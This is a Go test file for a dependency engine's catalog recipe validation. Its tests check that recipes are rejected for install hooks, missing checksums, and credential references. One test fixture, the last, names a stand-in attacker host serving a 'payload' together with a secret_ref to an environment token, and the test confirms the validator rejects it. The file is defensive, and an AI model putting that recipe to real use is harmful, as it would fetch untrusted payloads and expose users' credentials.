package app

import (
	"fmt"
	"strings"
	"testing"

	"github.com/Khorea1/depengine/internal/config"
)

func TestResolveLayersRejectsNonDeclarativeCatalogRecipe(t *testing.T) {
	root := t.TempDir()
	writeCatalogRecipe(t, root, "tool", `recipe_version = 1

[packages.tool]
native = "tool"
pre_install = { run = ["echo", "hi"] }
`)
	schema := &config.Schema{Version: 1, Tools: map[string]*config.Tool{"tool": {Name: "tool"}}}

	_, err := config.ResolveLayers(schema, nil, config.NewCatalog([]string{root}, validateCatalogRecipe), nil, false)
	if err == nil || !strings.Contains(err.Error(), "not declarative") {
		t.Fatalf("ResolveLayers() error = %v, want declarative rejection", err)
	}
}

func TestResolveLayersAcceptsDeclarativeCatalogRecipe(t *testing.T) {
	root := t.TempDir()
	writeCatalogRecipe(t, root, "tool", "recipe_version = 1\n\n[packages.tool]\nnative = \"tool\"\n")
	schema := &config.Schema{Version: 1, Tools: map[string]*config.Tool{"tool": {Name: "tool"}}}

	res, err := config.ResolveLayers(schema, nil, config.NewCatalog([]string{root}, validateCatalogRecipe), nil, false)
	if err != nil {
		t.Fatalf("ResolveLayers() error = %v", err)
	}
	if res.CatalogCount != 1 {
		t.Fatalf("CatalogCount = %d, want 1", res.CatalogCount)
	}
	if tool := res.Schema.Tools["tool"]; tool == nil || len(tool.Methods) != 1 {
		t.Fatalf("merged tool = %+v, want one catalog method", tool)
	}
}

func TestResolveLayersRejectsCatalogRecipeWithoutArtifactIntegrity(t *testing.T) {
	root := t.TempDir()
	writeCatalogRecipe(t, root, "tool", `recipe_version = 1

[packages.tool]
github = { repo = "owner/tool", asset = "tool.tar.gz", scope = "user" }
`)
	schema := &config.Schema{Version: 1, Tools: map[string]*config.Tool{"tool": {Name: "tool"}}}

	_, err := config.ResolveLayers(schema, nil, config.NewCatalog([]string{root}, validateCatalogRecipe), nil, false)
	if err == nil || !strings.Contains(err.Error(), "declares no checksum") {
		t.Fatalf("ResolveLayers() error = %v, want integrity rejection", err)
	}
}

func TestResolveLayersRejectsPartiallyChecksummedCatalogDistributions(t *testing.T) {
	root := t.TempDir()
	writeCatalogRecipe(t, root, "tool", `recipe_version = 1

[packages.tool.github]
repo = "owner/tool"
asset = "tool-{os_any}.tar.gz"
scope = "user"

[[packages.tool.github.distributions]]
when = { os = ["linux"] }
checksum = "sha256:0000000000000000000000000000000000000000000000000000000000000000"

[[packages.tool.github.distributions]]
when = { os = ["darwin"] }
`)
	schema := &config.Schema{Version: 1, Tools: map[string]*config.Tool{"tool": {Name: "tool"}}}

	_, err := config.ResolveLayers(schema, nil, config.NewCatalog([]string{root}, validateCatalogRecipe), nil, false)
	if err == nil || !strings.Contains(err.Error(), "distributions[1]") || !strings.Contains(err.Error(), "declares no checksum") {
		t.Fatalf("ResolveLayers() error = %v, want missing distribution checksum", err)
	}
}

func TestResolveLayersRejectsCatalogCredentialReference(t *testing.T) {
	root := t.TempDir()
	writeCatalogRecipe(t, root, "tool", fmt.Sprintf(`recipe_version = 1

[packages.tool.http]
url = "https://attacker.example/payload.tar.gz"
checksum = %q
secret_ref = { provider = "env", name = "SENSITIVE_TOKEN" }
`, importTestChecksum))
	schema := &config.Schema{Version: 1, Tools: map[string]*config.Tool{"tool": {Name: "tool"}}}
	_, err := config.ResolveLayers(schema, nil, config.NewCatalog([]string{root}, validateCatalogRecipe), nil, false)
	if err == nil || !strings.Contains(err.Error(), "secret_ref credential reference") {
		t.Fatalf("catalog credential reference was accepted: %v", err)
	}
}
